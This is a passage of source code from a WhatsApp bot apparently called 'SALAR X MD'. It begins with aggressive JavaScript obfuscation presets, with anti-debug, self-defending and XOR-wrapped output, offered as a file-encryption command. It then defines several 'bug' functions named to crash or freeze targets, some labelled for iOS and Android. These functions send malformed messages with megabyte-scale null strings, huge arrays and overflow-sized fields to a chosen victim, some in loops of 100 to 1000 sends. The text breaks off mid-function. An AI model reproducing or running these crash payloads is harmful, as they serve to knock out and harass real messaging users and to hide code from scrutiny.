            const base = vars[Math.floor(Math.random() * vars.length)];
            return `${base}${Math.random().toString(36).substring(2, 6)}`;
        },
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
    };
}
function getCustomObfuscationConfig(customName) {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    const generateCustomName = () => {
        let suffix = "";
        for (let i = 0; i < Math.floor(Math.random() * 3) + 2; i++)
            suffix += chars[Math.floor(Math.random() * chars.length)];
        return `${customName}_${suffix}`;
    };
    return {
        target: "node", compact: true, renameVariables: true, renameGlobals: true,
        identifierGenerator: generateCustomName, stringEncoding: true, stringSplitting: true,
        controlFlowFlattening: 0.75, shuffle: true, duplicateLiteralsRemoval: true,
        deadCode: true, opaquePredicates: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
    };
}
function getNebulaObfuscationConfig() {
    const generateNebulaName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        let r = "";
        for (let i = 0; i < 4; i++) r += chars[Math.floor(Math.random() * chars.length)];
        return `NX${r}`;
    };
    return {
        target: "node", compact: true, renameVariables: true, renameGlobals: true,
        identifierGenerator: generateNebulaName, stringCompression: true,
        stringConcealing: false, stringEncoding: true, stringSplitting: false,
        controlFlowFlattening: 0.75, flatten: true, shuffle: true, rgf: true,
        deadCode: true, opaquePredicates: true, dispatcher: true,
        globalConcealing: true, objectExtraction: true, duplicateLiteralsRemoval: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
    };
}
function getNovaObfuscationConfig() {
    return {
        target: "node", calculator: false, compact: true, controlFlowFlattening: 1,
        deadCode: 1, dispatcher: true, es5: true, duplicateLiteralsRemoval: 1,
        flatten: true, globalConcealing: true, hexadecimalNumbers: 1,
        identifierGenerator: () => "var_" + Math.random().toString(36).substring(7),
        lock: { antiDebug: true, integrity: true, selfDefending: true },
        minify: true, movedDeclarations: true, objectExtraction: true,
        opaquePredicates: true, renameGlobals: true, renameVariables: true,
        shuffle: true, stack: true, stringCompression: true, stringConcealing: true,
    };
}
function getMandarinObfuscationConfig() {
    const mandarinChars = ["龙","虎","风","云","山","河","天","地","雷","电","火","水","木","金","土","星","月","日","光","影","峰","泉","林","海","雪","霜","雾","冰","焰","石"];
    return {
        target: "node", compact: true, renameVariables: true, renameGlobals: true,
        identifierGenerator: () => { let n=""; for(let i=0;i<Math.floor(Math.random()*4)+3;i++) n+=mandarinChars[Math.floor(Math.random()*mandarinChars.length)]; return n; },
        stringEncoding: true, stringSplitting: true, controlFlowFlattening: 0.95,
        shuffle: true, duplicateLiteralsRemoval: true, deadCode: true, calculator: true,
        opaquePredicates: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
    };
}
function getArabObfuscationConfig() {
    const arabicChars = ["أ","ب","ت","ث","ج","ح","خ","د","ذ","ر","ز","س","ش","ص","ض","ط","ظ","ع","غ","ف","ق","ك","ل","م","ن","ه","و","ي"];
    return {
        target: "node", compact: true, renameVariables: true, renameGlobals: true,
        identifierGenerator: () => { let n=""; for(let i=0;i<Math.floor(Math.random()*4)+3;i++) n+=arabicChars[Math.floor(Math.random()*arabicChars.length)]; return n; },
        stringEncoding: true, stringSplitting: true, controlFlowFlattening: 0.95,
        shuffle: true, duplicateLiteralsRemoval: true, deadCode: true, calculator: true,
        opaquePredicates: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
    };
}
function getJapanObfuscationConfig() {
    const japaneseChars = ["あ","い","う","え","お","か","き","く","け","こ","さ","し","す","せ","そ","た","ち","つ","て","と","な","に","ぬ","ね","の","は","ひ","ふ","へ","ほ","ま","み","む","め","も","や","ゆ","よ","ら","り","る","れ","ろ","わ","を","ん"];
    return {
        target: "node", compact: true, renameVariables: true, renameGlobals: true,
        identifierGenerator: () => { let n=""; for(let i=0;i<Math.floor(Math.random()*4)+3;i++) n+=japaneseChars[Math.floor(Math.random()*japaneseChars.length)]; return n; },
        stringEncoding: true, stringSplitting: true, controlFlowFlattening: 0.9,
        flatten: true, shuffle: true, duplicateLiteralsRemoval: true, deadCode: true,
        calculator: true, opaquePredicates: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
    };
}
function getJapanxArabObfuscationConfig() {
    const mixed = ["あ","い","う","え","お","か","き","く","さ","し","す","た","ち","つ","な","に","ぬ","は","ひ","ふ","ま","み","む","や","ゆ","よ","ら","り","る","わ","を","ん","أ","ب","ت","ث","ج","ح","خ","د","ذ","ر","ز","س","ش","ص","ض","ط","ظ","ع","غ","ف","ق","ك","ل","م","ن","ه","و","ي"];
    return {
        target: "node", compact: true, renameVariables: true, renameGlobals: true,
        identifierGenerator: () => { let n=""; for(let i=0;i<Math.floor(Math.random()*4)+3;i++) n+=mixed[Math.floor(Math.random()*mixed.length)]; return n; },
        stringCompression: true, stringConcealing: true, stringEncoding: true,
        stringSplitting: true, controlFlowFlattening: 0.95, flatten: true, shuffle: true,
        rgf: false, dispatcher: true, duplicateLiteralsRemoval: true, deadCode: true,
        calculator: true, opaquePredicates: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
    };
}
function getSiuCalcrickObfuscationConfig() {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return {
        target: "node", compact: true, renameVariables: true, renameGlobals: true,
        identifierGenerator: () => { let r=""; for(let i=0;i<6;i++) r+=chars[Math.floor(Math.random()*chars.length)]; return `气Noesz和YuiSiu无${r}`; },
        stringCompression: true, stringEncoding: true, stringSplitting: true,
        controlFlowFlattening: 0.95, shuffle: true, rgf: false, flatten: true,
        duplicateLiteralsRemoval: true, deadCode: true, calculator: true,
        opaquePredicates: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
    };
}

// ── Obfuscator khusus (quantum & time-locked) — config TIDAK diubah ──
async function obfuscateQuantum(fileContent) {
    const generateTimeBasedIdentifier = () => {
        const timeStamp = new Date().getTime().toString().slice(-5);
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_$#@&*";
        let id = "qV_";
        for (let i = 0; i < 7; i++)
            id += chars[Math.floor((parseInt(timeStamp[i % 5]) + i * 2) % chars.length)];
        return id;
    };
    const ms = new Date().getMilliseconds();
    const phantom = ms % 3 === 0 ? `if(Math.random()>0.999)console.log('PhantomTrigger');` : "";
    if (typeof fileContent !== 'string') fileContent = String(fileContent);
    const clean = fileContent.replace(/'/g, "\\'").replace(/\n/g, "\\n").replace(/\r/g, "\\r");
    const obfuscated = await safeObfuscate(clean + phantom, {
        target: "node", preset: "high", compact: true, renameVariables: true,
        renameGlobals: true, identifierGenerator: generateTimeBasedIdentifier,
        stringCompression: true, stringConcealing: false, stringEncoding: true,
        controlFlowFlattening: 0.9, flatten: true, shuffle: true, rgf: true,
        opaquePredicates: { count: 8, complexity: 5 }, dispatcher: true,
        globalConcealing: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true },
        duplicateLiteralsRemoval: true,
    });
    let code = obfuscated.code || obfuscated;
    if (typeof code !== "string") throw new Error("Hasil obfuscation bukan string");
    const key = ms % 256;
    const escaped = code.replace(/'/g, "\\'").replace(/\\/g, "\\\\").replace(/\n/g, "\\n").replace(/\r/g, "\\r");
    return `(function(){var k=${key};return function(c){return c.split('').map(function(x,i){return String.fromCharCode(x.charCodeAt(0)^(k+(i%16)));}).join('');}('${escaped}');})();`;
}
async function obfuscateTimeLocked(fileContent, days) {
    const expiry = new Date();
    expiry.setDate(expiry.getDate() + parseInt(days));
    const expiryTs = expiry.getTime();
    const wrapped = `(function(){const expiry=${expiryTs};if(new Date().getTime()>expiry){throw new Error('Script has expired after ${days} days');}${fileContent}})();`;
    const obfuscated = await safeObfuscate(wrapped, {
        target: "node", compact: true, renameVariables: true, renameGlobals: true,
        identifierGenerator: "randomized", stringCompression: true, stringConcealing: true,
        stringEncoding: true, controlFlowFlattening: 0.75, flatten: true, shuffle: true,
        rgf: false, opaquePredicates: { count: 6, complexity: 4 }, dispatcher: true,
        globalConcealing: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true },
        duplicateLiteralsRemoval: true
    });
    let code = obfuscated.code || obfuscated;
    if (typeof code !== "string") throw new Error("Hasil obfuscation bukan string");
    return code;
}

// ── Processor utama: ringan, 1x pesan "memproses", 1x pesan hasil ──
// Obfuscate dijalankan via setImmediate supaya tidak blok event loop terlalu lama
// (memberi kesempatan command lain tetap diproses di antara micro-tasks).
async function processEncWA(m, devtrust, configOrFn, methodName, addNewsletterContext) {
    const quoted = m.quoted || m;
    const isDoc = quoted?.mtype === 'documentMessage' || (quoted?.msg?.mimetype || '').includes('javascript') || (quoted?.msg?.fileName || '').endsWith('.js');
    if (!isDoc) {
        return await devtrust.sendMessage(m.chat,
            addNewsletterContext({ text: `❌ Reply to a *.js* file with *.${methodName}*` }),
            { quoted: m }
        );
    }
    const fileName = quoted?.msg?.fileName || 'file.js';
    if (!fileName.endsWith('.js')) {
        return await devtrust.sendMessage(m.chat,
            addNewsletterContext({ text: `❌ Only *.js* files are supported` }),
            { quoted: m }
        );
    }
    if (!JsConfuser) {
        return await devtrust.sendMessage(m.chat,
            addNewsletterContext({ text: `❌ Module *js-confuser* belum terinstall di server.` }),
            { quoted: m }
        );
    }

    await devtrust.sendMessage(m.chat,
        addNewsletterContext({ text: `🔒 *EncryptBot*\n⏳ Processing [${methodName}]...` }),
        { quoted: m }
    );

    const tmpPath = path.join('./tmp', `enc_${methodName}_${Date.now()}.js`);
    try {
        const fileContent = await downloadWADocument(m, devtrust);
        try { new Function(fileContent); } catch (e) { throw new Error(`Invalid code: ${e.message}`); }

        let customName = null;
        if (methodName.startsWith('custom_')) customName = methodName.slice('custom_'.length);

        // Obfuscation dijalankan di worker thread terpisah —
        // event loop utama (koneksi WhatsApp) tetap responsif/tidak macet.
        const obfuscatedCode = await runObfuscateWorker({ methodName, fileContent, customName });

        fsx.writeFileSync(tmpPath, obfuscatedCode);
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                document: fsx.readFileSync(tmpPath),
                mimetype: 'application/javascript',
                fileName: `enc_${methodName}_${fileName}`,
                caption: `✅ *Encrypted file (${methodName}) ready!*`,
            }),
            { quoted: m }
        );
        fsx.removeSync(tmpPath);
    } catch (error) {
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({ text: `❌ *Error:* ${error.message}` }),
            { quoted: m }
        );
        if (fsx.existsSync(tmpPath)) fsx.removeSync(tmpPath);
    }
}

module.exports = async (devtrust, m, chatUpdate, store) => {
    global._rajuDevtrust = devtrust; // untuk auto-timeout session di luar handler pesan
    channelReact.attach(devtrust);
    try {
        const from = m?.from || m?.chat || m?.key?.remoteJid;

        // Newsletter configuration
        const NEWSLETTER_JID = '120363427254972269@newsletter';
        const NEWSLETTER_NAME = "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 by 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗";

        const addNewsletterContext = (messageContent) => {
            if (messageContent.contextInfo) {
                return {
                    ...messageContent,
                    contextInfo: {
                        ...messageContent.contextInfo,
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: NEWSLETTER_JID,
                            newsletterName: NEWSLETTER_NAME,
                            serverMessageId: -1
                        }
                    }
                };
            }
            return {
                ...messageContent,
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: NEWSLETTER_JID,
                        newsletterName: NEWSLETTER_NAME,
                        serverMessageId: -1
                    }
                }
            };
        };

        const replyWithNewsletter = async (jid, text, quotedMsg, mentions = []) => {
            try {
                await devtrust.sendMessage(jid,
                    addNewsletterContext({
                        text: text,
                        mentions: mentions
                    }),
                    { quoted: quotedMsg }
                );
            } catch (error) {
                console.error('Reply with newsletter error:', error);
                await devtrust.sendMessage(jid,
                    { text: text, mentions: mentions },
                    { quoted: quotedMsg }
                );
            }
        };

        const reply = async (text, mentions = []) => {
            try {
                return await replyWithNewsletter(m.chat, text, m, mentions);
            } catch (error) {
                console.error('Reply failed:', error);
                return null;
            }
        };
    
    
const owner = getOwner();
const Premium = getPremium();

        // ======================[ FIXED COMMAND DETECTION ]======================
        const body = (
            m.mtype === "conversation" ? m.message?.conversation :
                m.mtype === "extendedTextMessage" ? m.message?.extendedTextMessage?.text :
                    m.mtype === "imageMessage" ? m.message?.imageMessage?.caption :
                        m.mtype === "videoMessage" ? m.message?.videoMessage?.caption :
                            m.mtype === "documentMessage" ? m.message?.documentMessage?.caption || "" :
                                m.mtype === "audioMessage" ? m.message?.audioMessage?.caption || "" :
                                    m.mtype === "stickerMessage" ? m.message?.stickerMessage?.caption || "" :
                                        m.mtype === "buttonsResponseMessage" ? m.message?.buttonsResponseMessage?.selectedButtonId :
                                            m.mtype === "listResponseMessage" ? m.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message?.templateButtonReplyMessage?.selectedId :
m.mtype === "interactiveResponseMessage"
    ? (() => { try { return JSON.parse(m.msg?.nativeFlowResponseMessage?.paramsJson || '{}').id || ''; } catch { return ''; } })() :
    m.mtype === "messageContextInfo" ? message?.buttonsResponseMessage?.selectedButtonId ||

                                                            m.message?.listResponseMessage?.singleSelectReply?.selectedRowId || m.text :
                                                            m.mtype === "reactionMessage" ? m.message?.reactionMessage?.text :
                                                                m.mtype === "contactMessage" ? m.message?.contactMessage?.displayName :
                                                                    m.mtype === "contactsArrayMessage" ? m.message?.contactsArrayMessage?.contacts?.map(c => c.displayName).join(", ") :
                                                                        m.mtype === "locationMessage" ? `${m.message?.locationMessage?.degreesLatitude}, ${m.message?.locationMessage?.degreesLongitude}` :
                                                                            m.mtype === "liveLocationMessage" ? `${m.message?.liveLocationMessage?.degreesLatitude}, ${m.message?.liveLocationMessage?.degreesLongitude}` :
                                                                                m.mtype === "pollCreationMessage" ? m.message?.pollCreationMessage?.name :
                                                                                    m.mtype === "pollUpdateMessage" ? m.message?.pollUpdateMessage?.name :
                                                                                        m.mtype === "groupInviteMessage" ? m.message?.groupInviteMessage?.groupJid :
                                                                                            m.mtype === "viewOnceMessage" ? (m.message?.viewOnceMessage?.message?.imageMessage?.caption ||
                                                                                                m.message?.viewOnceMessage?.message?.videoMessage?.caption ||
                                                                                                "[Pesan sekali lihat]") :
                                                                                                m.mtype === "viewOnceMessageV2" ? (m.message?.viewOnceMessageV2?.message?.imageMessage?.caption ||
                                                                                                    m.message?.viewOnceMessageV2?.message?.videoMessage?.caption ||
                                                                                                    "[Pesan sekali lihat]") :
                                                                                                    m.mtype === "viewOnceMessageV2Extension" ? (m.message?.viewOnceMessageV2Extension?.message?.imageMessage?.caption ||
                                                                                                        m.message?.viewOnceMessageV2Extension?.message?.videoMessage?.caption ||
                                                                                                        "[Pesan sekali lihat]") :
                                                                                                        m.mtype === "ephemeralMessage" ? (m.message?.ephemeralMessage?.message?.conversation ||
                                                                                                            m.message?.ephemeralMessage?.message?.extendedTextMessage?.text ||
                                                                                                            "[Pesan sementara]") :
                                                                                                            m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :
                                                                                                                m.mtype === "protocolMessage" ? "[Message deleted]" :
                                                                                                                    ""
        );


        const ownerNumber = owner[0] || "254700000000";

        // Get user-specific prefix from the new system
        let prefix = getUserPrefix(m.sender) || '.';

        // STRICT command detection - ONLY detect if message STARTS WITH user's prefix
        const isCmd = body && typeof body === 'string' && body.startsWith(prefix);

        let command = '';
        let args = [];
        let text = '';

        if (isCmd) {
            // Extract command ONLY if it starts with user's prefix
            const afterPrefix = body.slice(prefix.length).trim();
            const parts = afterPrefix.split(/ +/);
            command = parts[0].toLowerCase();
            args = parts.slice(1);
            text = args.join(' ');

            console.log('✅ Command detected for user:', command);
        }

        // SPECIAL CHECK: If user types ONLY the default "." - show THEIR current prefix
        if (body && body.trim() === '.') {
            reply(`🔧 *Your current prefix:* \`${prefix}\`\n_You can change it using_ \`${prefix}setprefix [new]\``);
            return;
        }

        const qtext = args.join(" ");
        const q = args.join(" ");
        const tempMailData = {};
        const quoted = m.quoted ? m.quoted : m;
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid;
        const userMovieSessions = {};
        const groupMetadata = m.isGroup ? await devtrust.groupMetadata(from).catch(() => null) : null;
        const participants = m.isGroup ? groupMetadata?.participants || [] : [];
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : [];
        const botNumber = await devtrust.decodeJid(devtrust.user.id);
        const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
        const isDev = owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
        const isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
        const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
        const isSudo = getSudo().includes(m.sender);
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
        const groupName = m.isGroup ? groupMetadata?.subject || "" : "";
        const pushname = m.pushName || "No Name";
        const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z');
        const mime = (quoted.msg || quoted).mimetype || '';
        const todayDateWIB = new Date().toLocaleDateString('id-ID', {
            timeZone: 'Asia/Jakarta',
            year: 'numeric',
            month: 'long',
            day: 'numeric',
        });

        // ============ STICKER HELPER FUNCTIONS ============
        async function sendImageAsSticker(chatId, media, quoted, options = {}) {
            try {
                const sticker = new Sticker(media, {
                    pack: options.packname || global.packname || "𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
                    author: options.author || global.author || "𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
                    type: StickerTypes.FULL,
                    quality: 80,
                    background: '#00000000'
                });
                const stickerBuffer = await sticker.toBuffer();
                await devtrust.sendMessage(chatId, { sticker: stickerBuffer }, { quoted });
                return true;
            } catch (error) {
                console.error('Image sticker error:', error);
                throw error;
            }
        }

        async function sendVideoAsSticker(chatId, media, quoted, options = {}) {
            try {
                const sticker = new Sticker(media, {
                    pack: options.packname || global.packname || "𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
                    author: options.author || global.author || "𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
                    type: StickerTypes.FULL,
                    quality: 50,
                    background: '#00000000'
                });
                const stickerBuffer = await sticker.toBuffer();
                await devtrust.sendMessage(chatId, { sticker: stickerBuffer }, { quoted });
                return true;
            } catch (error) {
                console.error('Video sticker error:', error);
                throw error;
            }
        }

        // ============ STYLETEXT FUNCTION ============
        async function styletext(text) {
            return [
                { name: 'Normal', result: text },
                { name: 'Bold', result: '**' + text + '**' },
                { name: 'Italic', result: '*' + text + '*' },
                { name: 'Strikethrough', result: '~' + text + '~' },
                { name: 'Monospace', result: '```' + text + '```' }
            ];
        }

        // ============ RANDOM COLOR FUNCTION ============
        function randomColor() {
            const colors = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white', 'greenBright', 'yellowBright'];
            const colorIndex = Math.floor(Math.random() * colors.length);
            const colorName = colors[colorIndex];

            // Return chalk color function
            switch (colorName) {
                case 'red': return chalk.red;
                case 'green': return chalk.green;
                case 'yellow': return chalk.yellow;
                case 'blue': return chalk.blue;
                case 'magenta': return chalk.magenta;
                case 'cyan': return chalk.cyan;
                case 'white': return chalk.white;
                case 'greenBright': return chalk.greenBright;
                case 'yellowBright': return chalk.yellowBright;
                default: return chalk.white;
            }
        }
        // ==================================================
        
//NEW FUNCTION
async function TempekBusuk(devtrust, target) {
  const CrBMakLo = {
    groupStatusMessageV2: {
      message: {
        stickerPackMessage: {
          stickerPackId: "\u0000".repeat(999),
          name: "kill",
          publisher: "\u0000".repeat(999),
          fileLength: 9999,
          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
          mimetype: "image/webp",
          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
          contextInfo: {
            statusAttributionType: 2,
            statusAttributions: Array.from({ length: 200000 }, () => ({ type: 1 }))
          },
        },
      },
    },
  };

  const CrB = generateWAMessageFromContent(target, CrBMakLo, {});
  await devtrust.relayMessage(target, CrB.message, {
    messageId: CrB.key.id
  });
}

async function vcs(target) {
  await devtrust.relayMessage(target, {
    interactiveMessage: {
      body: { text: "Call Visible" },
      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select"
          },
          {
            name: "voice_call",
            buttonParamsJson: "\0".repeat(1000000)
          }
        ]
      }
    }
  }, {
    participant: { jid: target }
  });
}
//IOS
async function iosscrashinvs(devtrust, target) {
    await devtrust.relayMessage('status@broadcast', {    
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: [],
            unifiedResponse: {
              data: Buffer.from(JSON.stringify({
                response_id: crypto.randomUUID(),
                sections: [
                  {
                    view_model: {
                      primitive: {
                        text: "lixo",
                        inline_entities: ["{".repeat(50000)],
                        __typename: "GenAIMarkdownTextUXPrimitive",
                        },
                      __typename: "GenAISingleLayoutViewModel",
                    }
                  }
                ]
              }))
            },
            contextInfo: {
              forwardingScore: 1,
              isForwarded: true,
              forwardOrigin: 4,
              forwardedAiBotMessageInfo: {
                botJid: "0@bot"
              }
            }
          }
        }
      }
    }, {
      statusJidList: [target],      
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{ tag: 'to', attrs: { jid: target }, content: [] }]
        }]
      }]
    })
    await sleep(1000);
  }
        
async function rajugb(devtrust, target) {
  const Xsmsg = {
    groupStatusMessageV2: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
          fileLength: 999999999,
          height: 9999,
          width: 9999,
          mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
          fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
          directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1776937541",
          jpegThumbnail: null,
          caption: "CattXforce",
          scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
          scanLengths: [
            9999999999999999999,
            9999999999999999999,
            9999999999999999999,
            9999999999999999999
          ],
          midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
        }
      }
    }
  };

  const msg = await generateWAMessageFromContent(target, Xsmsg, {});

  await devtrust.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
  console.log(chalk.blue("𝗦𝗬𝗦𝗧𝗘𝗠 𝗕𝗨𝗚 𝗥𝗨𝗡!"));
}

//FUNCTION BULLDOZER
async function CV10(devtrust, target) {
  try {
    for (let i = 0; i < 1000; i++) {
      const msg = {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                name: "send_location",
                paramsJson: "\0".repeat(1045000),
                version: 3
              },
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      };
      
      await devtrust.relayMessage(target, {
        groupStatusMessageV2: {
          message: msg
        }
      }, { 
        participant: { jid: target }
      });
      
      if ((i + 1) % 2 === 0) {
        await new Promise(c => setTimeout(c, 750));
      }
      
      console.log(`✅ Send ke-${i + 1} sukses: ${target}`);
    }
  } catch (err) {
    console.error(`❌ Error: ${err.message}`);
  }
}

//RAJU ANDRO
async function rajuxandro(target, mention = false) {
  for (let z = 0; z < 100; z++) {
    const nullLength = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
        fileLength: 388944,
        height: 1600,
        width: 1200,
        mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
        fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
        directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1776937541",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRMhMhQiQVEUMnH/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERATIUBBUVJxof/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRof/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          isQuestion: true,
          isGroupStatus: true
        },
        caption: " RAJU X HERE.",
        scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
        scanLengths: [
          2899999999999999077,
          1799999999999998555,
          7699999999999999148,
          1069999999999999164
        ],
        midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
      }
    };

    let msg = await generateWAMessageFromContent(target, nullLength, {});

    await devtrust.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await devtrust.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: {
              protocolMessage: {
                key: msg.key,
                type: 25
              }
            }
          }
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "false" },
              content: undefined
            }
          ]
        }
      );
    }
    await new Promise(resolve => setTimeout(resolve, 2500));
    console.log(chalk.blue("𝗦𝗬𝗦𝗧𝗘𝗠 𝗕𝗨𝗚 𝗥𝗨𝗡!"));
  }
}
        
//DELAY INVISIBLE
async function rajudelayin(devtrust, target) {
  for (let z = 0; z < 100; z++) {
    await devtrust.relayMessage("status@broadcast", {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/706703788_1346924573971315_1414158698537555666_n.enc?ccb=11-4&oh=01_Q5Aa4gENOH7knwbjrwHfiP8lJmjeM-Ue-ZVbQJVaVt8p8_OMvQ&oe=6A3D0F90&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "dy6rjLbf2Zdmt1V3y15X1WYHEsUXS1DUh4G6yV3fM2I=",
